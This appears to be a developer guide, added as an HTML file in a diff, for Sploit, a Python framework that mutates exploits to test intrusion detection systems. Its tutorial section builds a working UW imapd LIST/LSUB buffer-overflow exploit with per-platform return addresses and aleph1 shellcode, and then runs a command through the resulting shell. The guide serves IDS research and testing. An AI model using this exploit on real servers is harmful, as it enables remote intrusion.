@@ -1,0 +1,841 @@
+<html>
+<head>
+ <title>Sploit</title>
+ <link rel="stylesheet" href="sploit.css" type="text/css">
+</head>
+
+<body>
+
+<div id=sheet>
+<br>
+
+<div id="title">
+ <div ALIGN=center>
+  <font SIZE=7><font COLOR=black>Sploit Mutation Framework</font></font><br>
+  <font SIZE=6><font COLOR=black>Developer Guide</font></font><br>
+  <font SIZE=5>Version 0.2<br></font>
+ </div>
+</div>
+
+<br><br>
+
+Everything in Sploit, from the core engine to the graphical user
+interface, is written in Python.<br>
+This basically means two things:
+<ol>
+ <li> If you don't know how to program in Python, this guide won't
+  make any sense for you.<br> You should better start with something
+  like <a href="http://www.python.org/doc/current/tut/tut.html"> the
+  python tutorial</a>.  
+<li> If you already know Python (and you should, since it is a really
+  wonderful language), Sploit will probably be easy to understand and
+  modify (thanks to Python and despite the fact that Sploit is not
+  particularly well-written)
+</ol>
+
+You probably don't need to read the whole guide. The idea is to read
+the following brief description of the Sploit internal structure, and
+then read until the section that contains the information you are
+looking for. The section order is somehow important: for instance, if
+you want to write a new mutant operator you probably also need to
+understand how an attack template is written.
+
+<br><br>
+
+But let's go back to the main picture.
+The Sploit framework can be split in seven different components:
+
+<ul>
+ <li><b>Attack Template</b> - An attack template is a python class
+ containing the exploit code. The code is written using a set of
+ special libraries that allow the engine to automatically modify the
+ exploit, creating a number of <i>mutants</i>.
+ 
+ </li> <li><b>Mutant Operators</b> - A mutant operator is a piece of
+ python code that implements a transformation function. There are
+ mutant operators operating at different levels of abstraction, such
+ as the network level and the application level, and with different
+ parameters.
+
+ <li><b>Sploit libraries</b> - These are the libraries that can be
+ used to write an attack template. In the current version there are
+ libraries managing HTTP, FTP, IP, TCP, IMAP, and EGGs
+ (shellcode). Each library provides special hooks for registering one
+ or more mutant operators.</li>
+
+ <li><b>Mutant Factory</b> - A mutant factory is the component that
+ implements the policy used to drive the mutation process. It is the
+ mutant factory that selects the list of mutant operators that have to
+ be applied to generate a given mutant.</li>
+
+ <li><b>Alert Collector</b> - It is the component in charge of
+ retrieving the alert messages from the IDS sensors. </li>
+
+ <li><b>The Sploit Engine</b> - It's the core of the whole
+ system. It's in charge of gluing together all the other components
+ and supervising the mutant execution.</li>
+
+ <li><b>Command line and graphical interfaces</b> - The two interfaces
+ a user can use to interact with Sploit</li>
+</ul>
+
+When the user runs the system, the engine enters a main loop
+performing the following actions at each iteration: 
+
+<ol> 
+
+<li>The engine invokes the mutant factory, passing the result of the
+    previous mutant and the alerts correlated with the previous attack
+    as parameters. The mutant factory replies with the list of mutant
+    operators that must be applied to the exploit template in order to
+    generate the next mutant.</li>
+
+<li>The engine connects the required mutant operators to the right
+    hooks in the Sploit libraries.</li>
+
+<li>The exploit template (modified by the mutant operators) is
+    executed against the target system.</li>
+
+<li>The engine interrogates the oracle to know the attack result.</li>
+
+<li>The engine asks the alert collectors to retrieve and correlate the
+    alert messages raised by the IDS sensors.</li>
+
+</ol>
+
+Now you are ready to jump to one of the following section:
+<ul>
+<li><a href="#exploit">How to write your own exploit template</a>
+<li><a href="#operator">How to write a new mutant operator</a>
+<li><a href="#collector">How to write an alert collector</a>
+<li><a href="#factory">How to implement a new exploration algorithm</a>
+</ul>
+
+<br><br>
+<a name="exploit"></a>
+<div class="stitle">How to write your own exploit template</div>
+<br>
+
+To better explain how to write an exploit script we are going to
+follow a real example.<br> 
+
+Suppose you decide to write an attack to exploit the University Of
+Washington imapd Buffer Overflow Vulnerabilities (references: <a
+href="http://www.securityfocus.com/bid/1110">BID 1110</a> and <a
+href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2000-0284">CAN-2000-0284</a>).
+SecurityFocus describes the vulnerability as follow:
+
+<br><br><center>
+<table width="80%">
+<tr><td>
+A buffer overflow exists in imapd. The vulnerability exists in the
+list command. By supplying a long, well-crafted string as the second
+argument to the list command, it becomes possible to execute code on
+the machine.
+<br>
+Executing the list command requires an account on the machine. In
+addition, privileges have been dropped in imapd prior to the location
+of the buffer overrun. As such, this vulnerability would only be
+useful in a scenario where a user has an account, but no shell level
+access. This would allow them to gain shell access.
+</td></tr>
+</table>
+</center><br>
+
+So, what we need to do is open a connection with the remote vulnerable
+server, sending a valid userid and password and then put our shellcode
+as second parameter of a <code>list</code> command. We can also
+download a working exploit from the Security Focus <a
+href="http://www.securityfocus.com/bid/1110/exploit">exploit page</a>.
+<br>That seems a wonderful starting point....  <br><br>
+
+We need to translate everything in Python and put our code in a class
+that extends the base <code>Exploit</code> class. <br>
+We can start with the following skeleton:
+
+<pre>
+class WUImapdBO(Exploit):
+
+    def __init__(self)
+
+    def set_up(self)
+
+    def tear_down(self) 
+
+    def execute(self)
+
+    def isSuccessful(self)
+</pre>
+
+The Sploit engine calls the <code>set_up</code> method only once
+before running the exploit and then calls <code>tear_down</code> after
+the execution of the last mutant. These are the right places to put
+some initialization code, to connect and disconnect to a remote
+oracle, and so forth. The attack code has to be placed in the
+<code> execute </code> method, while the <code> isSuccessful </code>
+function should contains the oracle interrogation.
+<br><br>
+
+<h2>The Constructor</h2>
+
+The constructor serves the purpose of calling the base Exploit
+constructor (setting the name and the description of the attack) and
+defining the attack parameters.<br>
+The first operation is simple:
+<pre>
+  Exploit.__init__(self,'Wu-imapd buffer overflow', 'some description')
+</pre>
+
+The description can also contain HTML tags to look better when displayed in
+the graphical interface.
+<br><br>
+
+The parameters definition is more complex. In Sploit there are many
+classes that support parameters (e.g. Exploit, Mutant Operator, and
+Alert Collector). Adding a parameter to an object provides a way to
+add a new field to the object itself, with some more infrastructure
+that allows the Sploit framework to identify that field as a parameter
+that the user can modify (through the graphical interface or some
+configuration file). 
+<br><br> 
+
+Each parameter is defined by a <code>Parameter</code> object and can
+be added using the <code>add_parameter</code> function. Looking in the
+<code>hasparameters.py</code> file, we can find some predefined
+classes to manage string, integer, and keylist parameters. Each
+parameter has a name, a description string, and a
+<code>isMultiValues</code> flag that defines whether the user should
+be able to set a list of values instead of a single one (we will use
+extensively this feature with Mutant Operators).
+
+<br><br> 
+
+Since our exploit should be able to login on the remote server, the
+user should be able to setup a valid userid and password. So, we need
+to add two string parameters, one for the userid and one for the
+password field (default values "foo" and "bar"):
+
+<pre>
+  self.add_param(StringParam('USER','foo', 'A valid userid'))
+  self.add_param(StringParam('PASSWD','bar', 'The password for the
+       previous userid'))
+</pre>
+
+Then, the exploit needs to know the target platform in order to choose
+the correct return address for the shellcode. In this case, the
+parameter should be able to accept only one of the following values
+(taken by the original exploit downloaded from SecurityFocus):
+
+<pre>
+target_platform = [
+  "Slackware 7.0 - IMAP4rev1 v12.261",
+  "Slackware 7.1 - IMAP4rev1 v12.264",
+  "RedHat    6.2(ZooT) - IMAP4rev1 v12.264",
+  "Slackware 7.0 - IMAP4rev1 2000.284"
+]
+</pre>
+
+The keylist parameter does exactly what we need:
+<pre>
+self.add_param(KeyListParam('PLATFORM',target_platform[2],
+  target_platform, 'The target platform (used to choose the return address)'))
+</pre>
+
+Finally, we need a way to understand whether the attack was successful
+or not. Since our exploit is going to open a shell on the remote
+system, we can ask the user which command will be executed trough the
+shell and what is the result that we must expect. An another couple of
+parameters can resolve this problem:
+
+<pre>
+self.add_param(StringParam('CMD','cat /flag.txt', 'The command to be
+  executed on the remote host'))
+
+self.add_param(StringParam('RESULT','well done','The string that must
+  be present in the result if the attack is successful'))
+</pre>
+
+In this case, the default behavior consists in printing the content of
+the <code>/flag.txt</code> file on the target machine, and return that
+the attack was successful if we receive back the "<code>well
+done</code>" string.
+
+<h2>Attack setup</h2>
+
+Since the <code>set_up</code> method is executed only once at the
+beginning of the testing process, it is the right place to configure
+the shellcode.
+
+<pre>
+ 1  def set_up(self):
+ 2     if self.PLATFORM == target_platform[0]:   
+ 3        self.retaddr = "\xec\xf3\xff\xbf" 
+ 4     elif self.PLATFORM == target_platform[1]: 
+ 5        self.retaddr = "\xe0\xf4\xff\xbf"
+ 6     elif self.PLATFORM == target_platform[2]:
+ 7        self.retaddr = "\x97\xf6\xff\xbf"
+ 8     elif self.PLATFORM == target_platform[3]: 
+ 9        self.retaddr = "\xc8\xeb\xff\xbf"
+
+10     self.eggm = egg.EggManager(egg.aleph1, 1064)
+11     self.eggm.append_ret(self.retaddr,25)
+</pre>
+
+The lines from 2 to 9 check the value of the <code>PLATFORM</code>
+parameter and set the corresponding return address.<br> Line 10
+instantiates a new <code>EggManager</code> telling it that we are
+going to use the standard aleph1 shellcode and that the whole egg size
+is going to be 1064 bytes.  The last line add the return address (25
+times) at the end of the shellcode (the <code>EggManager</code> will
+take care of reducing the nop slash to preserve the total size of 1064
+bytes). The use of the <code>EggManager</code> class, instead of just
+using a byte array for the shellcode, allows Sploit to automatically
+introduce mutation at the egg layer. 
+
+<h2>The attack code</h2>
+
+The <code>exploit.py</code> defines two exception that can be raised
+during the attack: a <code>ServiceDown</code> exception to be used any
+time the attack thinks the target service is not working properly and
+a generic <code>ExploitError</code> exception to report any other
+problem occurring during the exploit execution. When an attack raises
+a <code>ServiceDown</code> exception the engine waits a couple of
+seconds and then tries again to execute the same mutant. After three
+failed attempts it stops the process and asks the user to restart the
+service. Instead, in case of an <code>ExploitError</code> exception,
+the engine proceeds executing the next mutant.
+
+<br><br>
+
+Sploit provides a set of libraries, each one managing a different
+protocol. In the current version, you can find a manager that provides
+partial support for the following protocols: <code>HTTP</code>,
+<code>FTP</code>, <code>IMAP</code>, <code>TCP</code>, and
+<code>IP</code>. Even though the user can directly access the network
+layer managers (TCP, IP, Eth), these are usually automatically managed
+by the Sploit engine. In fact, whenever a user (or another protocol
+manager) create a socket, the Sploit libraries take care of
+instantiating either a traditional Python socket or a userland socket
+depending on the attack setup.<br> 
+In our case we just need an <code>IMAP</code> manager.
+
+<br><br>
+
+Finally, each exploit automatically provides a log channel, accessible
+through the <code>self.log</code> field. The attack code should use it
+to log different kind of messages, using the functions
+<code>self.log.debug("msg")</code>, <code>self.log.info("msg")</code>,
+<code>self.log.warning("msg")</code>, and
+<code>self.log.error("msg")</code>. All these messages are usually
+redirected to a special buffer during the exploit execution. The user
+can decide what to do with the buffer and what level of verbosity he
+wants to be accepted (please refer to the <a
+href="./user-guide.html">user guide</a> for any details on how to
+configure the logging subsystem).
+
+<br><br>
+ 
+Back to our attack, we identified four different steps:
+<ol>
+<li> Connect to the target system
+<li> Send a valid userid and password
+<li> Send the shellcode
+<li> If we get the shell, execute the user command and save the result
+</ol>
+
+Let's start opening the connection:
+
+<pre>
+def execute(self):
+    self.res       = ''
+    imap = IMAP.IMAPManager()
+                
+    self.log.info("Connecting to the server...")
+
+    if imap.connect()==False:
+        raise exploit.ServiceDown
+</pre>
+
+At the beginning, we initialized the <code>self.res</code> field that
+will contain the attack result. Then, we instantiate an
+<code>ImapManager</code> and we call the <code>connect()</code>
+method. As you can see, it is not necessary to specify the target
+address, since the Sploit engine takes care of that.  If the
+connection process fails, our code raises a <code>ServiceDown</code>
+exception to tell the engine that something went wrong during the
+connection phase.
+
+<br><br>
+
+The next step consists in sending the userid and password:
+
+<pre>
+    self.log.info("Sending login...")
+
+    imap.send_cmd('login %s %s'%(self.USER, self.PASSWD)))
+                
+    resp = imap.get_imap_response()
+                
+    if not ("OK LOGIN" in resp):
+        self.log.error("Login failed!!")
+        raise exploit.ExploitError("Login failed")
+</pre>
+
+The <code>ImapManager</code> provides two method for sending data:
+<code>send_cmd(imap_commmand)</code> and
+<code>send_raw(string)</code>. Calling <code>send_raw</code> you can
+force the manager to send the string as it is, without any
+modification. The <code>send_cmd</code> function receives instead an
+<code>IMAPCommand</code> object (or a string that will be parsed to
+build a <code>IMAPCommand</code> object). Using this method, the
+engine passes the command object through all the Mutant Operators that
+have been registered to work at the IMAP layer.<br>
+
+Our code uses the <code>send_cmd</code> to send the login command and
+then calls the <code>get_imap_response</code> method to get the server
+response. If the response does not contain the "<code>OK LOGIN</code>"
+string, the exploit logs a message and raises an error.<br> Note that
+the IMAP protocol require each command to start with a tag. If you
+need to use a specific tag, you can create your
+<code>IMAPCommand</code> object and set your tag. Since we do not care
+about choosing our tags, we let the <code>ImapManager</code> do that for us.
+
+<br><br>
+
+Step 3: sending the shellcode:
+
+<pre>        
+    self.log.info("Logged-in.\nSending the shellcode...")
+                
+    imap.send_cmd('lsub "" {1064}')
+    resp = imap.get_imap_response()
+    self.log.info("Resp: %s"%resp)
+                                
+    self.log.info("Sending shellcode...")
+    imap.send_raw(self.eggm.get_egg())
+    imap.send_raw("\n")
+    imap.send_raw("\n")
+</pre>
+
+As you can see, the raw shellcode data are sent using the <code>send_raw</code>
+method because it's a payload and we don't want that the ImapManager
+try to interpret it as an IMAP command.
+
+<br><br>
+
+Finally, we are going to execute the user command and check the result:
+
+<pre>
+    time.sleep(2)
+                
+    self.log.info("Sending shell command: %s"%self.CMD)
+    imap.send_raw(self.CMD+"\n")
+    self.res = imap.sock.readline('\n',blocking=True)
+                
+    self.log.debug("Response:\r\n%r"%self.res)
+    imap.close()
+</pre>
+
+Here, we start sleeping two second waiting for the shell and then we
+send the user command. We also need an hack to read the server
+response. In fact, after the shell is open, we are not talking anymore
+with the IMAP server. So, the <code>ImapManager</code> is not able
+anymore to interpret the traffic in the correct way. For this reason,
+we need to bypass it, reading the response directly from the
+underlying socket. To simplify this process, in Sploit every protocol
+manager provides a reference to the underlying network socket.<br>
+The final result was stored in the <code>self.res</code> field.
+
+
+<h2>A simple oracle</h2>
+
+The <code>exploit.py</code> file defines the result code that can be
+returned by the oracle:
+
+<pre>
+RES_OK      = 1  # The exploit run successfully
+RES_ERROR   = 2  # An error occurred during the exploit execution
+RES_FAIL    = 3  # The exploit finished but failed
+RES_UNKNOWN = 4  # The exploit finished but the result is unknown
+</pre>
+
+Everytime the attack raises an <code>ExploitError</code> exception, the
+engine sets the result to <code>RES_ERROR</code> without interrogate
+the exploit oracle. The result <code>RES_UNKNOWN</code> should be
+avoided and used only when the oracle it is not able to correctly
+correlate the state of the service with the attack execution.
+
+<br><br>
+
+In our example, writing an oracle is as simple as checking the content
+of the <code>self.res</code> field:
+
+<pre>
+def isSuccessful(self):
+   if self.RESULT in self.res:
+       return exploit.RES_OK
+   else:
+       return exploit.RES_FAIL
+</pre>
+
+<br><br>
+<a name="operator"></a>
+<div class="stitle">How to write a new mutant operator </div>
+<br>
+
+A mutant operator operates as filter that receives one or more objects
+(the type and the number depends on the layer), apply some
+transformation, and return one or more objects to the caller.
+<br>
+
+Each mutant operator extends the <code>MutantOperator</code> class,
+and implements three different methods: <code>mutate</code> (that
+contains the transformation code), <code>insert</code> (that connect
+the operator to the right library hook), and <code>remove</code> (that
+disable the operator).
+
+<br><br>
+
+Even though it is possible to inherit directly from the base
+<code>MutantOperator</code> class, it is a better practice to extend
+one of the existing sub-classes. For instance, if you want to add a new
+operator that works with the IMAP protocol, you should extend the
+<code>IMAPLayerOperator</code> class:
+
+<pre>
+class IMAPLayerOperator(MutantOperator):
+    group             = 'IMAP Layer' 
+    group_description = '''This mutations are applied to the IMAP
+        commands before sending them to the server'''
+    isa_operator      = False  # cannot be instantiated
+        
+    def mutate(self, requests):
+        return requests
+                
+    def insert(self):
+        IMAP.DEFAULT_IMAP_OPERATORS.append(self)
+        
+    def remove(self):
+        IMAP.DEFAULT_IMAP_OPERATORS.remove(self)
+</pre>
+
+This class is just a skeleton that defines how the operator adds and
+removes itself from the IMAP library. It sets the values of the
+<code>group</code> and <code>group_description</code> fields. Finally,
+the <code>isa_operator = False</code> tells the engine that this is
+not an real operator and it should not appear in the mutant operator
+list. 
+
+<br><br>
+
+Let's take the exploit we wrote in the previous section. Since it uses
+the <code>ImapManager</code>, it already takes advantage of all the
+existing general purpose IMAP Mutant Operators. <br>
+
+Reading the vulnerability description, we can see that the same
+vulnerability affects different commands (<code>COPY</code>,
+<code>LSUB</code>, <code>RENAME</code>, <code>FIND</code>, and
+<code>LIST</code>) while our exploit just uses one of them. So, now we
+want to add an operator that substitutes one command with another,
+preserving the same parameters.
+
+<br><br>
+
+This is the code:
+
+<pre>
+class ImapReplaceCommand(IMAPLayerOperator):
+  isa_operator      = True
+
+  def __init__(self):
+    IMAPLayerOperator.__init__(self,'IMAPReplaceCommand',
+      'Substitute a commmand with another')
+
+    self.add_param(StringParam('From','LSUB','Command to be replaced', True))
+    
+    param = StringParam('To','FIND','Command alternatives', True)
+    param.set_multiple_values(['FIND', 'LIST'])
+    self.add_param(param)
+
+  def mutate(self, cmds):
+    result = []
+    for c in cmds:
+      if c.cmd == self.From:
+        c.cmd = self.To
+      result.append(c)
+    return result
+</pre>
+
+The idea is simple. Inside the constructor we set the operator name,
+a brief description, and we add two parameters: <code>From</code> that
+contains the command to be substituted and <code>To</code> that
+contains the list of alternatives (refer to the previous section for
+more information about the parameters syntax).<br> Everytime the
+exploit try to send an IMAP command, the <code>IMAPManager</code> pass
+the command through the chain of the <code>mutate</code> methods
+provided by each subscribed mutant operators.<br>
+The actual type of the <code>cmds</code> parameters depends on the
+protocol manager. It can be a list of IP packets, HTTP requests, or
+FTP commands. In our case, <code>mutate</code> receives a list of
+<code>ImapCommand</code>, allowing the operator to add, remove, or
+modify any of them. The method must return a new list of <code>IMAPCommand</code>.  
+
+<br><br>
+
+The code is trivial. We just check if one of the commands is equal to
+the one defined by the <code>From</code> field, and we substitute it
+with the current value of the <code>To</code> field (its current value
+is decided by the mutant factory).
+
+<br><br>
+
+<br><br>
+<a name="collector"></a>
+<div class="stitle">How to write an alert collector</div>
+<br>
+
+The alert collector is probably one of the most tricky part in the
+Sploit framework. Its role consists in retrieving the alert messages
+from the IDS sensor and correlate them to the right mutant. How this
+can be done is extremely IDS specific, but usually the idea consists
+in extracting the alert messages from some log files and compare the
+alert and the attack information to understand which mutant caused the
+message.
+
+<br><br>
+
+Any collector has an internal dictionary that contains the association
+between mutant numbers and alert messages. The dictionary contains
+also a special value, named "uncorrelated", that will contain any
+message the collector is not able to properly correlate to a specific
+mutant.<br>
+
+The main Collector class already provides the implementation of two
+methods: <code>reset()</code> and <code>get_alerts</code>. The first,
+as the name says, resets the content of the internal dictionary; the
+second is used to read the dictionary itself.
+<br><br>
+Collector, as many other classes in Sploit, extends the HasParameter
+class inheriting the functions to dynamically add parameters to its
+object (see the <a href="#exploit">exploit</a> section for more
+details on how to add parameters to an object).   
+
+
+<pre>
+class Collector(HasParameters):
+
+    def connect(target)
+        
+    def close() 
+
+    def get_name()
+
+    def correlate(self, exploits)
+        
+    def reset(self):
+        self.results = {"uncorrelated":[]}
+
+    def get_alerts(self, mutant_number=None):
+        '''
+        Return the alerts correlated to the mutant mutant_number
+        If mutant_number is None (the default value)
+        the function returns the whole alerts dictionary
+        '''
+
+        if mutant_number == None:
+            return self.results
+        elif self.results.has_key(mutant_number):
+            return self.results[mutant_number]
+        else:
+           return None
+</pre>
+
+Beside the obvious <code>get_name()</code>, a collector must implement
+three methods: <code>connect()</code>, <code>close()</code>, and
+<code>correlate(exploits)</code>. In the common case where the
+intrusion detection systems runs on a different computer than Sploit,
+<code>connect()</code> and <code>close()</code> can be used to open
+and close the channel to talk with the IDS system. 
+
+<br><br>
+
+The role of the <code>correlate(exploits)</code> function is to read
+the alert messages from the sensor and put them in the right place
+inside the dictionary. The method receives as parameter a list of
+exploit execution info, each containing the following information:
+
+<pre>
+number     --> The mutant number
+operators  --> The list of mutant operator used to generate the mutant
+tcp_ports  --> A couple [min,max] of the TCP ports used during the attack
+udp_ports  --> A couple [min,max] of the UDP ports used during the attack
+result     --> The attack result
+exectime   --> The execution time in second
+date       --> The date/time when the mutant was executed
+</pre> 
+
+Usually, there are two approaches to correlate the alert messages.
+The first consists in comparing the execution time with the time
+reported in the alert messages. A more precise solution is based on
+the ports numbers. In fact, each alert message, usually contains the
+source IP:PORT from which the attack was launched. Comparing the port
+number with the ones stored in the mutant execinfo, it should be easy
+to identify which mutant was responsible of raising the alert.      
+
+
+<br><br><br><br>
+<a name="factory"></a>
+<div class="stitle">How to write a new exploration algorithm</div>
+<br>
+
+In the previous sections we have seen how one or more mutant operators
+can be registered to apply their transformation during the execution
+of the attack template. But who decides which operators must be enable
+for a given mutant?
+
+<br><br>
+
+The user decides the subset of mutant operators that he wants to use
+in the testing experiment (see the <a href="./user-guide.html">user
+guide</a>). He also selects a mutant factory, that is responsible of
+combining such operators in multiple ways to effectively generate the
+mutants.
+
+<br><br>
+
+The following code fragment shows the methods provided by a MutantFactory:
+
+<pre>
+class MutantFactory(HasParameters):
+
+        def set_opmanager(self, opmanager)
+
+        def get_name(self)
+                
+        def require_sync_collectors(self)
+
+        def reset(self)
+
+        def set_first(self, firstmutant)
+      
+        def next(self, result)
+
+        def count(self)
+
+	def current_mutant(self)
+</pre>
+
+The function <code>set_opmanager</code> is called by the Sploit engine
+to set the Operator Manager. The <code>OpManager</code>, as the name
+says, is the object that manages the set of mutant operators. It
+provides methods to load the complete list of operators, add or remove
+an operator to the selected list, and move up and down an operator in
+the selected list. The mutant factory will use this object to enable,
+disable, and configure operators.
+
+<br><br>
+
+Before starting the testing process, the engine calls the
+<code>reset</code> method, followed by a <code>set_first</code> call
+to set the index of the first mutant that the user want to
+generate. Then, inside the main loop, the engine calls
+<code>next</code> until the method return <code>None</code> (that the
+way the mutant factory uses to say that it has already generated all
+the mutant according with its policy) or until the range of mutants
+chosen by the user have been executed. For instance, if the user runs
+Sploit with the <code>-r 4:8</code> parameter, the engine calls:
+<code>reset()</code>, <code>set_first(4)</code>, <code>next()</code>,
+<code>next()</code>, <code>next()</code>, <code>next()</code>.
+
+<br><br>
+
+The <code>count()</code> method should return the total number of
+mutant that the factory can generate. In case it is not possible to
+precompute this value the method should return -1. Finally,
+<code>require_synch_collectors()</code> tells the engine if the mutant
+factory is going to use or not the information provided by the alert
+collector to drive the exploration process. If the method returns
+<code>True</code>, the engine must interrogates the alert collectors
+synchronously after each mutant execution, otherwise it adopts the
+more efficient solution that consists in collecting and correlating
+all the alert messages at the end of the testing experiment. 
+
+<br><br>
+
+For instance, we can analyze the code of the OneAtTimeFactory:
+ 
+<pre>
+class OneAtTheTimeFactory(MutantFactory):
+ 
+    def __init__(self):
+        MutantFactory.__init__(self, "One at the time")
+        self.reset()
+
+    def set_first(self, mutantnumber):
+        if mutantnumber >= 0 and mutantnumber < self.number:
+            self.current = mutantnumber
+            return True
+        return False
+
+    def reset(self):
+        self.current = 0
+        self.number  = 0
+        if self.opmanager == None:
+            return
+        self.selected = self.opmanager.get_selected_operators()
+        if len(self.selected)==0:
+            self.number = 0
+        else:           
+            for y in self.selected:
+                self.number += y.params_combinations()
+
+
+    def next(self, result):
+        if self.opmanager == None:
+            return None
+
+        if (self.current >= self.number):
+            return None
+                
+        n = self.current
+        for y in self.selected:
+            if y.params_combinations() > n:
+                y.set_params_combination(n)
+                self.current += 1
+                return [y]
+            n = n - y.params_combinations()
+
+    def require_sync_collectors(self):
+        return False
+
+    def count(self):
+        return self.number
+
+    def current(self):
+         return self.current
+
+</pre>
+
+The <code>reset()</code> function compute the total number of mutant
+that can be generated (and saves it in the <code>self.number</code>
+field) and gets the list of the mutant operators that have been
+selected by the user (and saves it in the <code>self.selected</code>
+field).<br>
+
+The <code>next()</code> method contains the actual code that selects
+and configures the operators for each mutant. The idea is simple: it
+browse the selected operators asking them how many parameter
+combinations they support (using the built-in
+<code>params_combinations()</code> method). After the correct mutant
+operator has been found, the parameters can be set using another
+operator function: <code>set_params_combination(int)</code>.
+<br>
+
+Note that since the factory can compute the next mutant without any
+information about the execution of the previous attacks, this factory
+does not require a synchronous alert collection phase.
+
+
+</div>
+</body>
+</html>
